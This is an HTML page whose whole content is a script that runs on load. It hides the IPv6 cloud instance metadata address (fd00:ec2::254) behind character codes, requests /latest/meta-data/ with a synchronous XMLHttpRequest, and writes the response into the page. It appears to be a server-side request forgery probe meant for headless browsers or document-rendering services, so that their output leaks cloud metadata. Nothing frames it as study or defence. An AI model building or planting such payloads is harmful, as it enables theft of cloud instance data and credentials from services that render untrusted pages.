<!DOCTYPE html>
<html><body>
<h1>TIMEOUT0_SYNCXHR</h1>
<div id="r1">INITIAL</div>
<script>
setTimeout(function() {
  try {
    var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
    var proto = String.fromCharCode(104,116,116,112);
    var xhr = new XMLHttpRequest();
    xhr.open('GET', proto + '://[' + ip + ']/latest/meta-data/', false);
    xhr.send();
    document.getElementById('r1').innerText = 'T0_STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
  } catch(e) {
    document.getElementById('r1').innerText = 'T0_ERROR:' + e.name + ':' + e.message;
  }
}, 0);
</script>
</body></html>
